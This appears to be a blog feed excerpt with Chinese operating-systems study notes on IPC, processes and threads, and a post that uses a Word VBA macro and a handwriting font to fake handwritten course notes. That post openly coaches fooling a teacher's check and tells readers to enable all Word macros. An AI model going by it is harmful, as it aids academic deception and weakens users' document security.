    <link href="http://yoursite.com/2020/06/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1/"/>
    <id>http://yoursite.com/2020/06/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1/</id>
    <published>2020-06-08T07:59:19.000Z</published>
    <updated>2020-06-08T08:08:16.844Z</updated>
    
    <content type="html"><![CDATA[<p>本章节包括两个小节</p><ol><li>进程间通信 (InterProess Communicatiin,IPC)</li><li>经典的IPC问题</li></ol><a id="more"></a><h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h2><p>在本小节会涉及到：</p><ol><li>什么是临界区资源<ol><li>竞争</li><li>保证临界区互斥的4个条件</li></ol></li><li>互斥的策略1 (Busy Waiting)<ol><li>禁止中断</li><li>锁变量</li><li>严格轮换法</li><li>⭐Peterson 算法</li><li>TSL 指令</li></ol></li><li>互斥的策略2<ol><li>上述策略的缺陷（忙等待 优先级反向）</li><li>Sleep &amp; Wakeup<ol><li>问题：唤醒丢失</li></ol></li><li>⭐信号量 Semaphore<ol><li>互斥信号量 Mutexe</li><li>PV操作</li></ol></li><li>管程 Monitor</li><li>消息传递</li><li>屏障</li></ol></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TODO：第四节：IPC</span><br></pre></td></tr></table></figure><h2 id="Classical-IPC-Problems"><a href="#Classical-IPC-Problems" class="headerlink" title="Classical IPC Problems"></a>Classical IPC Problems</h2><p>本小节将涉及到几个常见IPC模型：</p><ol><li>生产者与消费者</li><li>读者与写者</li><li>进餐的哲学家</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本章节包括两个小节&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;进程间通信 (InterProess Communicatiin,IPC)&lt;/li&gt;
&lt;li&gt;经典的IPC问题&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="专业课" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B8%93%E4%B8%9A%E8%AF%BE/"/>
    
      <category term="操作系统" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="学习笔记" scheme="http://yoursite.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="操作系统" scheme="http://yoursite.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>使用伪手写体搞定毛概笔记</title>
    <link href="http://yoursite.com/2020/06/06/%E4%BD%BF%E7%94%A8%E4%BC%AA%E6%89%8B%E5%86%99%E4%BD%93%E6%90%9E%E5%AE%9A%E6%AF%9B%E6%A6%82%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/06/06/%E4%BD%BF%E7%94%A8%E4%BC%AA%E6%89%8B%E5%86%99%E4%BD%93%E6%90%9E%E5%AE%9A%E6%AF%9B%E6%A6%82%E7%AC%94%E8%AE%B0/</id>
    <published>2020-06-06T05:41:39.000Z</published>
    <updated>2020-06-06T08:39:29.488Z</updated>
    
    <content type="html"><![CDATA[<p>毛概课在接连上了五个月网课之后,终于等到了期末!</p><p>对此,毛概老师给全班做出指示: “收  给我收笔记!” </p><a id="more"></a><h2 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h2><p>众所周知, 大学的思政课笔记是最无聊虽没意义的形式主义了.</p><p>尤其是他还要求是手写的情况下.</p><p>尤其是手写的笔记还要拍照提交的情况下.</p><p><del>不会吧不会吧, 不会真的有人还在用纸笔记笔记吧? 🐶<del/></p><p>受亲爱的<a href="https://moefactory.com/" target="_blank" rel="noopener">小梦同学</a>提点, 我们来研究一下怎么<strong>仿造手写体</strong>打印材料.</p><p><strong>重要提醒</strong></p><p>由于打印机本身的限制, 实物还是肉眼可见地分辨出伪手写稿. 本学期因为以前的影响只要求把笔记拍照上传检查, 比较好蒙混过关🤔</p><p>如果是线下查收, 还是换个摸鱼方法吧….</p><p>本方法无需编程基础. </p><h2 id="开冲"><a href="#开冲" class="headerlink" title="开冲"></a>开冲</h2><h3 id="Step1-生成自己的手写字体"><a href="#Step1-生成自己的手写字体" class="headerlink" title="Step1. 生成自己的手写字体"></a>Step1. 生成自己的手写字体</h3><p>北京大学计算机科学技术研究所有一个项目<a href="http://59.108.48.27/flexifont-chn/login/" target="_blank" rel="noopener">Flexifont字库</a>, 可以实现自己的字库. 点开注册登录, 根据提示下载模板, 打印书写, 拍照生成就可以了. </p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/%5DI%7DRW22GJ%7B%401NL7JYIE%2483C.png" alt=""></p><p>如图, 下载不同字数的模板, 打印出来填好,  上传生成即可.</p><p>不过我没整这一步, 直接在字库分享里面下了别人的, 谢谢张建同学.</p><p>下载好.ttf文件后导入系统文件夹(C:\Windows\Fonts)即可.</p><h3 id="Step2-设置-Word-宏命令"><a href="#Step2-设置-Word-宏命令" class="headerlink" title="Step2. 设置 Word 宏命令"></a>Step2. 设置 Word 宏命令</h3><p>参考了 <a href="https://www.zhihu.com/question/20308770" target="_blank" rel="noopener">这个问题 </a>下的回答</p><p>在Word中依次点击 “文件 -&gt; 选项 -&gt; 信任中心 -&gt; 信任中心设置 -&gt; 宏设置” 在右侧选中 “启用所有宏”.</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/hongshezhi%20.png" alt="宏设置"></p><p><strong>回到主界面, 视图 - 宏 - 查看宏</strong></p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/2020%E5%B9%B46%E6%9C%886%E6%97%A53.png" alt="宏代码编写1"></p><p>输入方案名,新建, 并在弹出的窗口中插入以下代码</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">' 注意是插入 不是直接把原来的替换掉哦</span></span><br><span class="line">    <span class="keyword">Dim</span> R_Character <span class="keyword">As</span> Range</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Dim</span> FontSize(<span class="number">5</span>)</span><br><span class="line"><span class="comment">' 字体大小在5个值之间进行波动，可以改写 </span></span><br><span class="line"><span class="comment">' 个人建议 如果纸张线条间距为8mm, 字号设置为16左右比较合适</span></span><br><span class="line">    FontSize(<span class="number">1</span>) = <span class="string">"15.5"</span></span><br><span class="line">    FontSize(<span class="number">2</span>) = <span class="string">"15"</span></span><br><span class="line">    FontSize(<span class="number">3</span>) = <span class="string">"16"</span></span><br><span class="line">    FontSize(<span class="number">4</span>) = <span class="string">"17"</span></span><br><span class="line">    FontSize(<span class="number">5</span>) = <span class="string">"17.5"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">Dim</span> FontName(<span class="number">3</span>)</span><br><span class="line">    <span class="comment">'字体名称在三种字体之间进行波动，可改写，但需要保证系统拥有下列字体</span></span><br><span class="line">FontName(<span class="number">1</span>) = <span class="string">"宋体"</span></span><br><span class="line">FontName(<span class="number">2</span>) = <span class="string">"微软雅黑"</span></span><br><span class="line">FontName(<span class="number">3</span>) = <span class="string">"黑体"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">Dim</span> ParagraphSpace(<span class="number">5</span>)</span><br><span class="line"><span class="comment">'行间距 在一定以下值中均等分布，可改写 </span></span><br><span class="line"><span class="comment">' 个人建议 如果纸张线条间距为8mm, 字号设置为23左右比较合适, 并且不建议波动过大</span></span><br><span class="line">    ParagraphSpace(<span class="number">1</span>) = <span class="string">"22"</span></span><br><span class="line">    ParagraphSpace(<span class="number">2</span>) = <span class="string">"22.5"</span></span><br><span class="line">    ParagraphSpace(<span class="number">3</span>) = <span class="string">"23"</span></span><br><span class="line">    ParagraphSpace(<span class="number">4</span>) = <span class="string">"23.5"</span></span><br><span class="line">    ParagraphSpace(<span class="number">5</span>) = <span class="string">"24"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">'下面是功能代码 不想要什么直接删除就行</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">For</span> <span class="keyword">Each</span> R_Character <span class="keyword">In</span> ActiveDocument.Characters</span><br><span class="line"></span><br><span class="line">        VBA.Randomize</span><br><span class="line"></span><br><span class="line">        R_Character.Font.Name = FontName(Int(VBA.Rnd * <span class="number">3</span>) + <span class="number">1</span>)</span><br><span class="line"><span class="comment">'上面一行是随机变换字体,不想要可删除</span></span><br><span class="line">        R_Character.Font.Size = FontSize(Int(VBA.Rnd * <span class="number">5</span>) + <span class="number">1</span>)</span><br><span class="line"><span class="comment">'上面一行是随机变换字体大小,不想要可删除</span></span><br><span class="line">        R_Character.Font.Position = Int(VBA.Rnd * <span class="number">3</span>) + <span class="number">1</span></span><br><span class="line"><span class="comment">'上面一行对每个字随机上下微调,不想要可删除</span></span><br><span class="line">        R_Character.Font.Spacing = <span class="number">0</span></span><br><span class="line"><span class="comment">'上面一行不要修改</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line"></span><br><span class="line">    Application.ScreenUpdating = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">For</span> <span class="keyword">Each</span> Cur_Paragraph <span class="keyword">In</span> ActiveDocument.Paragraphs</span><br><span class="line"><span class="comment">'上面三行不要修改</span></span><br><span class="line">        Cur_Paragraph.LineSpacing = ParagraphSpace(Int(VBA.Rnd * <span class="number">5</span>) + <span class="number">1</span>)</span><br><span class="line"><span class="comment">'上面一行对每个行间距微调,不想要可删除</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line">        Application.ScreenUpdating = <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>修改后如图, 记得要把代码16-19行换成你自己的手写体</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/QQ%E6%88%AA%E5%9B%BE20200606154923.jpg" alt="代码修改如下"></p><p>点击上面的运行按钮(或者是个小绿三角) 等待</p><p>不出意外结果如下</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/2020%E5%B9%B46%E6%9C%886%E6%97%A515%E7%82%B951%E5%88%86.jpg" alt="记得要把字体换成自己的手写体哦"></p><p>记得把字体换成不同但相近的手写体, 别想现在一样丑不拉几的</p><h3 id="Step3-设置页面与段落"><a href="#Step3-设置页面与段落" class="headerlink" title="Step3. 设置页面与段落"></a>Step3. 设置页面与段落</h3><p>准备好打印机, 复印纸, 以及浪费很多纸张的决心, 开始下一步.</p><p><del>当然你要实现准备好电子笔记, 你不会真的没有记吧?<del/></p><h4 id="字体字号"><a href="#字体字号" class="headerlink" title="字体字号"></a>字体字号</h4><p>在上一步我们应该是基本解决了这个问题, 如果没有, 若纸张线条间距为8mm, 字号设置为16左右比较合适.</p><p>word 中字号的单位是磅, 约为0.3528毫米.也就是说16的字号打印出来大约是5.645毫米高.</p><p>此外可以试一下全部用 <strong>粗体</strong> , 因为我用的字体比较纤细, 看着太假</p><p>多试试, 不要怕废纸</p><h4 id="段落"><a href="#段落" class="headerlink" title="段落"></a>段落</h4><p>全选, 右键段落, 设置行间距与段间距.</p><p>间距一栏下</p><p><strong>段前段后:</strong>全部设置成0 空白也要再设置一次</p><p><strong>行距:</strong> 选择固定值, 这里单位依旧是磅数, 如果直线相隔8mm的话大约设置成23磅(23*0.35=8.1144‬)</p><h4 id="页面"><a href="#页面" class="headerlink" title="页面"></a>页面</h4><p>word主页面 - 布局 - 页边距&amp;纸张大小</p><p>自己量一量吧, 上边距是到第一行的<strong>字的上沿</strong>, 下边距是最后一行<strong>字的下沿</strong></p><p>多试试, 不要怕废纸</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/K%607_8GUVFXF0%24PQU81VDCUK.jpg" alt="这么多全是浪费掉的"></p><h3 id="Step4-其他作假手段"><a href="#Step4-其他作假手段" class="headerlink" title="Step4. 其他作假手段"></a>Step4. 其他作假手段</h3><ol><li><p>全部用粗体, 生成的字体过于纤细</p></li><li><p>切换字体确实有效,但是字体风格不能相差太大</p></li><li><p>扫描后对PDF做一下黑白处理, 更难发现</p><p>另外推荐使用app Scanbot扫描, 吊打某某扫描王</p></li><li><p>通过<a href="https://www.ilovepdf.com/compress_pdf" target="_blank" rel="noopener">这个网址</a>对PDF进行全损压缩, 直接挑压缩率最高的那个选项(斜眼笑)</p></li></ol><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>成品还是很满意滴~ </p><p>线上检查的话应该足够以假乱真了吧👌</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/QQ%E6%88%AA%E5%9B%BE20200606161805.jpg" alt="效果图1"></p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/QQ%E6%88%AA%E5%9B%BE20200606161822.jpg" alt="效果图2"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><p>听说Github上<a href="https://link.zhihu.com/?target=https%3A//github.com/Gsllchb/Handright">这个项目</a>可以进一步微调字体效果,实现同字不同样</p></li><li><p>使用喷墨式打印机应该会稍微好一些</p></li><li><p>学到了磅数这一没什么卵用的知识</p></li><li><p>为了本篇传图开了腾讯云的COS, 终于有图床了</p></li><li><p>其实笔记最好还是自己平时带着记比较好</p><p><del>但是这当然是不可能的啊哈哈哈哈<del/></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;毛概课在接连上了五个月网课之后,终于等到了期末!&lt;/p&gt;
&lt;p&gt;对此,毛概老师给全班做出指示: “收  给我收笔记!” &lt;/p&gt;
    
    </summary>
    
    
      <category term="技术小记" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E5%B0%8F%E8%AE%B0/"/>
    
      <category term="快乐摸鱼" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E5%B0%8F%E8%AE%B0/%E5%BF%AB%E4%B9%90%E6%91%B8%E9%B1%BC/"/>
    
    
      <category term="手写体" scheme="http://yoursite.com/tags/%E6%89%8B%E5%86%99%E4%BD%93/"/>
    
      <category term="word 宏命令" scheme="http://yoursite.com/tags/word-%E5%AE%8F%E5%91%BD%E4%BB%A4/"/>
    
      <category term="摸鱼" scheme="http://yoursite.com/tags/%E6%91%B8%E9%B1%BC/"/>
    
  </entry>
  
  <entry>
    <title>操作系统之进程线程</title>
    <link href="http://yoursite.com/2020/06/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/"/>
    <id>http://yoursite.com/2020/06/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/</id>
    <published>2020-06-05T09:06:22.000Z</published>
    <updated>2020-06-09T06:13:58.037Z</updated>
    
    <content type="html"><![CDATA[<p>本章节包括三个小节</p><ol><li>进程 (Processes)</li><li>线程 (Threads)</li><li>调度 (Scheduling)</li></ol><a id="more"></a><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/%E8%BF%9B%E7%A8%8B%2C%20%E7%BA%BF%E7%A8%8B%2C%20%E8%B0%83%E5%BA%A6.png" alt=""></p><h1 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h1><p>在本小节会涉及到：</p><ol><li>CPU是如何工作的，并由此引入进程的概念与用途</li><li>进程的生命周期：<ol><li>⭐进程的五种状态及之间的转换</li><li>进程的创建</li><li>进程的中止</li><li>两个进程的切换（上下文保存）</li></ol></li><li>⭐Process Control Blocks,PCB (进程表, 进程控制块)<ol><li>为什么要用PCB？</li><li>PCB 中包括什么？</li></ol></li></ol><h2 id="进程的引入及概念"><a href="#进程的引入及概念" class="headerlink" title="进程的引入及概念"></a>进程的引入及概念</h2><p>本章的内容(包括进程线程调度IPC)在于探讨如何更高效地利用CPU. 尽管市面上早已采用了多核架构, 但下述分析均为单核CPU, 如果要考虑多核的情况会事先说明。</p><p>既然是单核CPU，那么在同一时间刻CPU计算资源只能用在一个地方。如果我此时一边敲代码，一边听歌，一边挂QQ，那么实际上CPU的运行状态是在这些工作之间以毫秒级别的速度来回迅速切换，在宏观上造成几个工作同时进行的假象。也即是<strong>“微观串行，宏观并行”</strong>。<br>这样的情况我们被称为<strong>多道程序</strong> ，即同时有多个程序在执行中(宏观)，但实际上只有一个进程在使用CPU(微观)</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/1.jpg" alt="待配图1"></p><p><strong>进程：</strong> an executing program, including the current values of the program counter, register, and variables.<br>进程是进行中的程序。编写好的代码(.c, .py)或可运行的文件(.exe, .bat) 被成为程序。当他们被运行时才被称为进程。<br>一个进程包括：</p><ul><li>program counter, 程序计数器;用于标志该进程当前运行至程序的何处</li><li>stack, 栈; </li><li>data section,数据部分</li></ul><p>那么显然，多道程序中每个程序都拥有自己的PC、stack…</p><h2 id="进程的生命周期"><a href="#进程的生命周期" class="headerlink" title="进程的生命周期"></a>进程的生命周期</h2><h3 id="进程的状态与转换"><a href="#进程的状态与转换" class="headerlink" title="进程的状态与转换"></a>进程的状态与转换</h3><h4 id="进程的状态"><a href="#进程的状态" class="headerlink" title="进程的状态"></a>进程的状态</h4><p>进程是一个动态的客体，可以被创建销毁等。进程总共拥有五种生命状态(state)：</p><ol><li>new               创建</li><li>ready             就绪</li><li>running           运行</li><li>waiting/blocked   阻塞/等待态</li><li>terminated/exit        销毁</li></ol><h4 id="状态之间转换"><a href="#状态之间转换" class="headerlink" title="状态之间转换"></a>状态之间转换</h4><ul><li>new -&gt; ready</li><li>ready -&gt; running</li><li>running -&gt; ready</li><li>running -&gt; blocked</li><li>running -&gt; exit</li><li>blocked -&gt; ready</li></ul><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/2.jpg" alt="状态转换2"></p><h3 id="进程的创建"><a href="#进程的创建" class="headerlink" title="进程的创建"></a>进程的创建</h3><h4 id="进程的创建场景"><a href="#进程的创建场景" class="headerlink" title="进程的创建场景:"></a>进程的创建场景:</h4><ol><li>系统初始化</li><li>系统调用</li><li>用户命令</li><li>批处理作业的初始化</li></ol><h4 id="父子进程"><a href="#父子进程" class="headerlink" title="父子进程"></a>父子进程</h4><ul><li>父进程不断创建子进程,由此形成进程树</li><li>子进程<strong>可以</strong>继承父的资源(也可以不继承或半继承)</li><li>父子进程可以同时执行,也有可能父等待子</li><li>Unix 中存在这种进程的层级关系,Win 中进程的地位平等,不存在父子关系<ul><li>但是这一说法似乎不当, <a href="https://www.zhihu.com/question/31429459" target="_blank" rel="noopener">参看此处</a></li></ul></li></ul><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/3.jpg" alt="Unix进程树3"></p><h3 id="进程的销毁"><a href="#进程的销毁" class="headerlink" title="进程的销毁"></a>进程的销毁</h3><h4 id="进程销毁的场景"><a href="#进程销毁的场景" class="headerlink" title="进程销毁的场景"></a>进程销毁的场景</h4><ol><li><p>Normal exit    正常退出 (自愿)</p></li><li><p>Error exit        错误退出 (自愿)</p></li><li><p>Fatal error      致命性错误退出 (非自愿)</p><p>eg: 除0, 取非法地址</p></li><li><p>被其他进程杀死  (非自愿)</p><p>eg: 父进程, 系统, 其他优先级更高的进程</p></li></ol><h4 id="级联终止"><a href="#级联终止" class="headerlink" title="级联终止"></a>级联终止</h4><p>​    当父进程退出时,子进程必须退出.</p><h3 id="进程的切换"><a href="#进程的切换" class="headerlink" title="进程的切换"></a>进程的切换</h3><ul><li>进程的切换非常频繁, 一般在毫秒级</li><li>进程切换需要耗费时间, 称为Gap</li></ul><h4 id="进程切换的场景"><a href="#进程切换的场景" class="headerlink" title="进程切换的场景"></a>进程切换的场景</h4><ol><li><p>时钟中断</p><p>eg 时间轮片用尽</p></li><li><p>IO 中断</p></li><li><p>Memory Fault  内存失效</p><p>eg 内存中页面失效</p></li><li><p>Trap 陷入</p><p>发生错误时</p></li><li><p>Supervisor Call</p><p>管理程序调用</p></li></ol><h4 id="上下文切换"><a href="#上下文切换" class="headerlink" title="上下文切换"></a>上下文切换</h4><p>切出时, 必须保存该进程目前的环境.切入时,必须加载先前的环境</p><p>使用 PCB(Processing Control Block, 进程表,进程控制块) 来储存进程的环境</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/4.jpg" alt=""></p><h4 id="进程调度队列"><a href="#进程调度队列" class="headerlink" title="进程调度队列"></a>进程调度队列</h4><p>这一块没听 似乎是调度队列包括以下三种</p><ol><li>Job queue 系统中所有进程的队列</li><li>Ready queue 主存中所有进程的队列, 拿到CPU就跑的那种</li><li>Device queues 等待IO设备的进程队列</li></ol><h4 id="PCB"><a href="#PCB" class="headerlink" title="PCB"></a>PCB</h4><p>包括:</p><ol><li>进程管理数据<ul><li>寄存器</li><li>PC</li><li>状态字 PSW </li><li>进程状态</li><li>优先级</li><li>调度算法参数</li><li>进程ID</li><li>父进程ID</li><li>组进程ID</li><li>信号量</li><li>进程开始时间</li><li>进程已用时间</li><li>子进程已用时间</li><li>……</li></ul></li><li>内存管理数据<ul><li>指向本进程代码段指针</li><li>指向本进程数据段指针</li><li>指向本进程堆栈段指针</li></ul></li><li>文件管理数据<ul><li>根目录</li><li>工作目录</li><li>文件描述符</li><li>……</li></ul></li></ol><p>以上全部不用记🐶 下面的要记住(精简版)</p><blockquote><ol><li>Process state                 进程状态 </li><li>Program counter 程序计数器 </li><li>CPU registers CPU寄存器</li><li>CPU scheduling information CPU调度信息</li><li>Memory-management information  内存管理信息 </li><li>Accounting information 计账信息</li><li>I/O status information I/O状态信息</li></ol></blockquote><hr><h1 id="Threads"><a href="#Threads" class="headerlink" title="Threads"></a>Threads</h1><p>在本小节会涉及到：</p><ol><li>了解进程切换中的缺陷（时空开销过大），并由此引入线程的概念及用途</li><li>了解线程资源的私有与共享（有助于解决上一点的缺陷）, 并认识线程的优势</li><li>几种线程的实现方式及区别<ol><li>Kernel-level Thread   (内核级线程)</li><li>User-level Thread     (用户级线程)</li><li>Hybrid Thread         (混合式线程)</li><li>Pop-up Thread         (弹出式线程)</li></ol></li></ol><h2 id="线程的引入及概念"><a href="#线程的引入及概念" class="headerlink" title="线程的引入及概念"></a>线程的引入及概念</h2><p>你看进程之间切换是不是要保存好多东西,时空开销过大. 线程是轻量级的进程, 它拥有的环境没有进程那么多, 所以线程间的切换更加轻便.</p><ul><li>进程是为了避免等待IO的时间, 线程是为了缩短进程切换中的浪费的时间</li><li>线程是隶属于某一进程, 或者说<em>( traditional or heavyweight )</em>进程是仅有一个线程的进程</li><li>但是线程还是有必要的环境的</li><li>同一个进程的不同线程(兄弟线程)可以共享一部分资源</li></ul><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/5.jpg" alt="进程与线程5"></p><p>如上图, a图中每个进程都拥有一个线程, 这些线程拥有不同的地址空间. b图进程拥有3个线程, 共享一个进程地址.因此线程之间的切换会更加轻量.</p><p>但是也由于线程之间没有数据保护, 所以要防止线程间相互修改数据.</p><h2 id="进程资源的私有与共享"><a href="#进程资源的私有与共享" class="headerlink" title="进程资源的私有与共享"></a>进程资源的私有与共享</h2><p>对于同一个进程的不同线程(兄弟线程)来说:</p><h3 id="共享的items"><a href="#共享的items" class="headerlink" title="共享的items"></a>共享的items</h3><ol><li>地址空间</li><li>全局变量</li><li>文件流</li><li>子进程</li><li>Pending alarm (这是什么?)</li><li>信号量</li><li>记账信息( Accounting information)</li></ol><h3 id="私有的items"><a href="#私有的items" class="headerlink" title="私有的items"></a>私有的items</h3><ul><li>PC</li><li>寄存器(集)</li><li>堆栈空间</li><li>线程状态</li></ul><blockquote><p>When a multithreaded process is run on a single-CPU system, the threads take turns running</p><p>多线程运用在单核CPU上时并不能提升性能,反而因为线程切换而牺牲效率</p></blockquote><p>此处存疑: 无论单核多核, 线程切换不是总比进程切换高效吗?</p><h2 id="线程的状态"><a href="#线程的状态" class="headerlink" title="线程的状态"></a>线程的状态</h2><p>与进程一致:</p><ol><li>running</li><li>blocked</li><li>ready</li><li>terminated</li></ol><p>我也不知道为什么没有new态, 可能太快忽略不计? ┑(￣Д ￣)┍</p><h2 id="线程的优劣及应用场景"><a href="#线程的优劣及应用场景" class="headerlink" title="线程的优劣及应用场景"></a>线程的优劣及应用场景</h2><p>优势:</p><ul><li>占用空间小,切换时快捷</li><li>划分的资源少, 创建销毁更加容易</li><li>线程常被用于多核CPU</li></ul><p>应用场景:</p><ul><li>同时需要IO与处理的进程(eg 文字处理)</li><li>大型服务器回应用户请求.  作业小而多</li></ul><h2 id="不同级别的线程"><a href="#不同级别的线程" class="headerlink" title="不同级别的线程"></a>不同级别的线程</h2><h3 id="User-level-Thread"><a href="#User-level-Thread" class="headerlink" title="User-level Thread"></a>User-level Thread</h3><p>用户级线程.</p><p>对于线程的控制, 资源的分配都是由进程自己掌控. </p><p>从内核角度, 系统只知进程, 感知不到其线程的存在.</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/7.jpg" alt="线程模型6"></p><p>优点</p><ul><li>可以在不支持线程的OS上实现线程.<ul><li>OS管理进程表, 进程本身管理线程表</li><li>管理效率更高, 相比内核管理时更少的函数调用</li></ul></li><li>不同进程的线程调度算法可以采取不同策略</li><li>大大简化了内核的管理压力(需要管理的大量线程托付给进程管理了)</li></ul><h3 id="Kernel-level-Thread"><a href="#Kernel-level-Thread" class="headerlink" title="Kernel-level Thread"></a>Kernel-level Thread</h3><p>内核级线程</p><p>线程还是属于进程, 但是线程的管理有OS负责</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/8.jpg" alt="待配图7"></p><p>优点</p><ul><li><p>内核管理全部的线程, 调度地更加灵活</p><p>指: A进程的A1线程阻塞后, OS可以切换至A2线程 或B进程中的B1线程</p><p><del>但是这不就是进程切换了吗哪儿是优点了啊喂</del>!</p></li></ul><h3 id="Hybrid-Thread"><a href="#Hybrid-Thread" class="headerlink" title="Hybrid Thread"></a>Hybrid Thread</h3><p>混合级线程</p><p>待配图</p><p>就是一部分用户级一部分内核级</p><p><del>其实我也没觉得好哪了</del></p><p>优点</p><ul><li>将用户级 内核级的优势相结合<ul><li>内核级的模仿(mimic?)功能            //存疑 没懂想表达什么</li><li>用户级的性能</li></ul></li><li>避免不必要的用户-内核转换</li><li>Kernel assigns virtual processors to each process //存疑 没懂</li></ul><h3 id="Pop-up-Thread"><a href="#Pop-up-Thread" class="headerlink" title="Pop-up Thread"></a>Pop-up Thread</h3><p>弹出式线程</p><p>每当一个新消息(指外界请求)进入时, 进程弹出线程解决, 解决后销毁进程.</p><p>适用于类批处理任务, 如大型服务器回应用户请求.  作业小而多</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/10.jpg" alt="配图10"></p><p>优势</p><ul><li>线程即用即弃, 没有切换, 也无需保存历史数据</li></ul><h1 id="Scheduling"><a href="#Scheduling" class="headerlink" title="Scheduling"></a>Scheduling</h1><p>在本小节会涉及到：</p><ol><li>调度的概念<ol><li>CPU密集型与IO密集型作业</li><li>调度的目的</li><li>什么时候需要调度？</li><li>调度算法的目标（不同OS下目标有差异）</li></ol></li><li>不同系统下常见的调度算法<ol><li>批处理系统 (Batch SystemSs)<ol><li>First-come first-served        (FCFS,先来先服务)</li><li>Shortest job first             (SJF,短作业优先)</li><li>Shortest remaining time first (SRTF,最短剩余时间优先)</li></ol></li><li>交互式系统 (Interactive Systems)<ol><li>Round Robin                    